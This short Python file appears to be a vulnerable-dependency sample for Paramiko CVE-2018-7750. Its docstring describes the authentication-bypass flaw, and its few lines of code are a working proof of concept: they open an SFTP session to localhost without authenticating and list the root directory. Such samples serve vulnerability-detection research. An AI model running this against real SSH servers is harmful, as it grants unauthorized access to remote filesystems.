'''
In this file we find a function that uses the vulnerable 
paramiko dependency and its Transport module in its version 2.4.0.

Description: transport.py in the SSH server implementation of Paramiko
before 1.17.6, 1.18.x before 1.18.5, 2.0.x before 2.0.8, 2.1.x before 2.1.5,
2.2.x before 2.2.3, 2.3.x before 2.3.2, and 2.4.x before 2.4.1 does not
properly check whether authentication is completed before processing other
requests, as demonstrated by channel-open. A customized SSH client can simply
skip the authentication step.

Vulnerability: https://nvd.nist.gov/vuln/detail/CVE-2018-7750
Exploit: https://www.exploit-db.com/exploits/45712
'''

import paramiko

host = '127.0.0.1'
port = 22

trans = paramiko.Transport((host, port))
trans.start_client()

sftp = paramiko.SFTPClient.from_transport(trans)
print(sftp.listdir('/'))
sftp.close()
